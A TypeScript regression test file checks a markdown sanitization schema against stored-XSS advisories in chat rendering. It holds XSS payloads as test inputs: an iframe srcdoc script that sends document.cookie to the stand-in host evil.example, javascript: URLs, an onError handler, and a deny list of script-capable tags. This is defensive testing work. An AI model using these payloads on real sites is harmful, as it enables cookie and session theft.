/**
 * Real regression tests for the markdown sanitization schema.
 *
 * These back the fix for GHSA-7rw4-v4gc-r864 and its sibling advisories
 * (GHSA-rgr7-p4h9-m778, GHSA-9p6q-xgxx-wxpj, GHSA-mj96-25gq-mfrf,
 * GHSA-v589-24cr-526m, GHSA-7pxm-6pj3-fjjc, GHSA-26rv-2266-8vfc,
 * GHSA-9j9w-qggc-gw75, GHSA-97mc-pvgx-rfmp, GHSA-ww8j-mr23-v79r,
 * GHSA-cpq6-945x-82rc), all of which report stored XSS through
 * `rehypeRaw` rendering untrusted chat markdown as raw HTML.
 *
 * IMPORTANT: nothing here is mocked. These tests run the real
 * `hast-util-sanitize` against the real `markdownSanitizeSchema` built on the
 * real upstream `defaultSchema`. Mocking `rehype-sanitize` (as an earlier
 * version of the chat XSS suite did) makes `defaultSchema` undefined, which
 * silently degrades the schema under test and lets these assertions pass
 * against a control that isn't actually there.
 */

import type { Element, Properties, Root, Text } from "hast";
import { sanitize } from "hast-util-sanitize";
import { markdownSanitizeSchema } from "../sanitizeSchema";

const root = (children: Element[]): Root => ({ type: "root", children });

const el = (
  tagName: string,
  properties: Properties = {},
  children: Element["children"] = [],
): Element => ({ type: "element", tagName, properties, children });

const text = (value: string): Text => ({ type: "text", value });

const clean = (node: Element): Element | undefined =>
  (sanitize(root([node])) as Root).children[0] as Element | undefined;

const cleanWithSchema = (node: Element): Element | undefined =>
  (sanitize(root([node]), markdownSanitizeSchema) as Root).children[0] as
    | Element
    | undefined;

describe("markdownSanitizeSchema", () => {
  describe("schema invariants", () => {
    it("inherits the real upstream defaultSchema", () => {
      // Guards against the schema being built while `rehype-sanitize` is
      // mocked away, which would drop every inherited protection below.
      expect(markdownSanitizeSchema.clobber).toEqual([
        "ariaDescribedBy",
        "ariaLabelledBy",
        "id",
        "name",
      ]);
      expect(markdownSanitizeSchema.clobberPrefix).toBe("user-content-");
      expect(markdownSanitizeSchema.ancestors).toBeDefined();
    });

    it("does not allow any event-handler attribute on any element", () => {
      const attributes = markdownSanitizeSchema.attributes ?? {};
      const offenders: string[] = [];

      for (const [tag, attrs] of Object.entries(attributes)) {
        for (const attr of attrs ?? []) {
          const name = typeof attr === "string" ? attr : attr[0];
          if (/^on/i.test(name)) offenders.push(`${tag}.${name}`);
        }
      }

      expect(offenders).toEqual([]);
    });

    it("does not allow tags that can execute script or exfiltrate input", () => {
      const tagNames = markdownSanitizeSchema.tagNames ?? [];

      for (const tag of [
        "script",
        "style",
        "iframe",
        "object",
        "embed",
        "form",
        "input",
        "button",
        "textarea",
        "svg",
        "math",
        "base",
        "meta",
        "link",
      ]) {
        expect(tagNames).not.toContain(tag);
      }
    });

    it("strips script and style including their text content", () => {
      expect(markdownSanitizeSchema.strip).toEqual(
        expect.arrayContaining(["script", "style"]),
      );
    });

    /**
     * The invariant that GHSA-7rw4-v4gc-r864's remediation originally missed.
     *
     * `markdownSanitizeSchema.protocols` REPLACES `defaultSchema.protocols`
     * instead of merging with it. `hast-util-sanitize` only protocol-checks
     * attributes present in that map, so any URL-bearing attribute the schema
     * allows but forgets to list becomes an unguarded sink. That is exactly
     * how `cite` (inherited on blockquote/del/ins) and `poster` (added on
     * video) ended up accepting `javascript:`.
     */
    it("protocol-checks every URL-bearing attribute reachable on an allowed tag", () => {
      // Which attributes are actually URL sinks, and on which elements.
      // Mirrors the `html-url-attributes` map that react-markdown itself uses;
      // inlined rather than imported so this security invariant does not
      // silently change when a transitive dependency does. `null` means the
      // attribute is a URL sink on any element.
      const URL_SINKS: Record<string, string[] | null> = {
        action: ["form"],
        cite: ["blockquote", "del", "ins", "q"],
        data: ["object"],
        formAction: ["button", "input"],
        href: ["a", "area", "base", "link"],
        icon: ["command"],
        itemId: null,
        longDesc: ["img"],
        manifest: ["html"],
        ping: ["a", "area"],
        poster: ["video"],
        src: [
          "audio",
          "embed",
          "iframe",
          "img",
          "input",
          "script",
          "source",
          "track",
          "video",
        ],
      };

      const protocols = markdownSanitizeSchema.protocols ?? {};
      const attributes = markdownSanitizeSchema.attributes ?? {};
      const allowedTags = new Set(markdownSanitizeSchema.tagNames ?? []);
      const globalAttrs = (attributes["*"] ?? []).map((a) =>
        typeof a === "string" ? a : a[0],
      );

      const unguarded: string[] = [];

      for (const tag of allowedTags) {
        const tagAttrs = (attributes[tag] ?? []).map((a) =>
          typeof a === "string" ? a : a[0],
        );

        for (const attr of new Set([...tagAttrs, ...globalAttrs])) {
          const sinkOn = URL_SINKS[attr];
          const isSink =
            sinkOn === null || (sinkOn !== undefined && sinkOn.includes(tag));

          if (isSink && !(attr in protocols)) {
            unguarded.push(`${tag}[${attr}]`);
          }
        }
      }

      expect(unguarded).toEqual([]);
    });

    it("never widens a protocol allowlist inherited from upstream", () => {
      // Narrowing (e.g. dropping irc/xmpp from href) is fine; widening is not.
      const SAFE = new Set(["http", "https", "mailto"]);
      const protocols = markdownSanitizeSchema.protocols ?? {};

      for (const [attr, allowed] of Object.entries(protocols)) {
        for (const protocol of allowed ?? []) {
          expect({ attr, protocol, safe: SAFE.has(protocol) }).toEqual({
            attr,
            protocol,
            safe: true,
          });
        }
      }
    });
  });

  describe("sanitizer behavior against advisory payloads", () => {
    it("removes the iframe srcdoc payload from the GHSA-7rw4-v4gc-r864 PoC", () => {
      const out = cleanWithSchema(
        el("iframe", {
          srcdoc:
            "<script>location.href='https://evil.example/?c='+document.cookie</script>",
        }),
      );

      expect(out).toBeUndefined();
    });

    it.each(["script", "style"])(
      "strips <%s> elements including their text content",
      (tagName) => {
        const out = sanitize(
          root([el(tagName, {}, [text("must not survive")])]),
          markdownSanitizeSchema,
        ) as Root;

        expect(out.children).toEqual([]);
      },
    );

    it("drops inline event handlers while keeping the element", () => {
      const out = cleanWithSchema(
        el("img", { src: "https://example.com/a.png", onError: "alert(1)" }),
      );

      expect(out?.tagName).toBe("img");
      expect(out?.properties).toEqual({ src: "https://example.com/a.png" });
    });

    it.each([
      ["a", "href"],
      ["img", "src"],
      ["video", "poster"],
      ["blockquote", "cite"],
    ])("strips javascript: from %s[%s]", (tagName, attr) => {
      const out = cleanWithSchema(
        el(tagName, { [attr]: "javascript:alert(1)" }),
      );

      expect(out?.properties?.[attr]).toBeUndefined();
    });

    it.each(["object", "embed", "form", "input"])("drops <%s>", (tagName) => {
      expect(cleanWithSchema(el(tagName, {}))).toBeUndefined();
    });

    it("preserves legitimate links and media", () => {
      const link = cleanWithSchema(
        el("a", { href: "https://example.com", title: "ok" }),
      );
      expect(link?.properties).toEqual({
        href: "https://example.com",
        title: "ok",
      });

      const video = cleanWithSchema(
        el("video", {
          src: "https://example.com/v.mp4",
          poster: "https://example.com/p.png",
          controls: true,
        }),
      );
      expect(video?.properties?.poster).toBe("https://example.com/p.png");
    });

    it("prefixes id to prevent DOM clobbering", () => {
      const out = cleanWithSchema(el("div", { id: "location" }));

      expect(out?.properties?.id).toBe("user-content-location");
    });

    it("is at least as strict as the upstream default schema", () => {
      // Sanity check that our helper wiring is real: the upstream default
      // (used with no custom schema) also drops a script element.
      expect(clean(el("script", {}))).toBeUndefined();
    });
  });
});
